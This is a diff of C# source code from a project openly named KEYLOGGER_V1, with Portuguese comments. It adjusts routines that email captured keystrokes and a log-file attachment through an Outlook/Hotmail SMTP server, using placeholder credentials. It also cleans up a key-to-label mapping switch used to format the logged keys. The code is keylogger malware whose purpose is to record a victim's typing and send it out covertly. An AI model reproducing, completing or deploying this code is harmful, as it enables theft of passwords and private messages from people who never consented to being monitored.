@@ -140,10 +140,11 @@ namespace KEYLOGGER_V1
             Email.Subject = "KeyLLogger";
             Email.IsBodyHtml = true;
             Email.Body = Texto;
-            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
+            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
             using (cliente)
             {
-                cliente.Credentials = new System.Net.NetworkCredential("", "");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
+                cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
+                                                                               // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                 cliente.EnableSsl = true;
                 cliente.Send(Email);
             }
@@ -162,10 +163,12 @@ namespace KEYLOGGER_V1
             Email.Subject = "KeyLLogger";
             Email.IsBodyHtml = true;
             Email.Attachments.Add(new Attachment(DirBackup));
-            SmtpClient cliente = new SmtpClient("smtp.live.com", 587);
+            
+            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
             using (cliente)
             {
-                cliente.Credentials = new System.Net.NetworkCredential("", "");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
+                cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
+                                                                                                       // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                 cliente.EnableSsl = true;
                 cliente.Send(Email);
             }
@@ -217,241 +220,123 @@ namespace KEYLOGGER_V1
             {
 
                 case "LWin":
-
                     return "[Win]";
-                    break;
                 case "LControlKey":
-
                     return "[Ctrl]";
                 case "RControlKey":
-
                     return "[Ctrl]";
-                    break;
                 case "LMenu":
-
                     return "[Alt]";
-                    break;
                 case "RMenu":
-
                     return "[Alt]";
-                    break;
                 case "Return":
-
                     return "[Enter]";
-                    break;
                 case "Space":
-
                     return "[Space]";
-                    break;
                 case "LShiftKey":
-
                     return "[Shift]";
-                    break;
                 case "RShiftKey":
-
                     return "[Shift]";
-                    break;
                 case "Capital":
-
                     return "[Caps Lock]";
-                    break;
                 case "Tab":
-
                     return "[Tab]";
-                    break;
                 case "Oemtilde":
-
                     return "'";
-                    break;
                 case "Escape":
-
                     return "[Esc]";
-                    break;
                 case "Back":
-
                     return "[Back]";
-                    break;
                 case "PrintScreen":
-
                     return "[Print Screen]";
-                    break;
                 case "Pause":
-
                     return "[Pause Break]";
-                    break;
                 case "Insert":
-
                     return "[Insert]";
-                    break;
                 case "Delete":
-
                     return "[Delete]";
-                    break;
                 case "Home":
-
                     return "[Home]";
-                    break;
                 case "PageUp":
-
                     return "[Page Up]";
-                    break;
                 case "Next":
-
                     return "[Page Down]";
-                    break;
                 case "End":
-
                     return "[End]";
-                    break;
                 case "Apps":
-
                     return "[Menu]";
-                    break;
                 case "Up":
-
                     return "[Up]";
-                    break;
                 case "Down":
-
                     return "[Down]";
-                    break;
                 case "Right":
-
                     return "[Right]";
-                    break;
                 case "Left":
-
                     return "[Left]";
-                    break;
                 case "Oemplus":
-
                     return "=";
-                    break;
                 case "OemMinus":
-
                     return "-";
-                    break;
                 case "Oem6":
-
                     return "[";
-                    break;
                 case "Oem5":
                     return "]";
-                    break;
                 case "Oem7":
-
                     return "";
-                    break;
                 case "OemOpenBrackets":
-
                     return "´";
-                    break;
                 case "Oem1":
-
                     return "Ç";
-                    break;
                 case "Oemcomma":
-
                     return ",";
-                    break;
                 case "OemPeriod":
-
                     return ".";
-                    break;
                 case "OemQuestion":
-
                     return ";";
-                    break;
                 case "D1":
-
                     return "1";
-                    break;
                 case "D2":
-
                     return "2";
-                    break;
                 case "D3":
-
                     return "3";
-                    break;
                 case "D4":
-
                     return "4";
-                    break;
                 case "D5":
-
                     return "5";
-                    break;
                 case "D6":
-
                     return "6";
-                    break;
                 case "D7":
-
                     return "7";
-                    break;
                 case "D8":
-
                     return "8";
-                    break;
                 case "D9":
-
                     return "9";
-                    break;
                 case "D0":
-
                     return "0";
-                    break;
                 case "F1":
-
                     return "[F1]";
-                    break;
                 case "F2":
-
                     return "[F2]";
-                    break;
                 case "F3":
-
                     return "[F3]";
-                    break;
                 case "F4":
-
                     return "[F4]";
-                    break;
                 case "F5":
-
                     return "[F5]";
-                    break;
                 case "F6":
-
                     return "[F6]";
-                    break;
                 case "F7":
-
                     return "[F7]";
-                    break;
                 case "F8":
-
                     return "[F8]";
-                    break;
                 case "F9":
-
                     return "[F9]";
-                    break;
                 case "F10":
-
                     return "[F10]";
-                    break;
                 case "F11":
-
                     return "[F11]";
-                    break;
                 case "F12":
-
                     return "[F12]";
-                    break;
-
-
                 default:
 
                     return Key;
